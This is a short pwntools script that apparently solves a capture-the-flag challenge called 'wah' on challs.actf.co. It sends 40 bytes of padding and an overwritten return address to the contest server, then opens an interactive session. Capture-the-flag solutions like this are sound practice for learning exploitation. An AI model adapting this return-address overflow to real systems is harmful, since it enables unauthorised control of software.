from pwn import *

payload = b""
payload = payload.ljust(40, b"A")
payload += p64(0x00401236)

p = remote('challs.actf.co',31224)

#p = process(["./wah"])

p.recvS()
p.sendline(payload)
p.interactive()



